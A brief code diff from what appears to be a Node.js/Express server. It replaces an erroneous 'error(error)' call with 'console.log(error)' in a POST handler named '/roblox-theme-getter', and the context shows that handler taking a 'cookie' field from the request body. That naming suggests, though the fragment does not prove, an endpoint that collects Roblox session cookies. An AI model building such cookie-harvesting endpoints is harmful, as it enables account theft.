@@ -13,7 +13,7 @@ app.post('/roblox-theme-getter', (req, res) =>{
       cookie : req.body.cookie
     })
   } catch (error) {
-    error(error)
+    console.log(error)
   }
 })
 
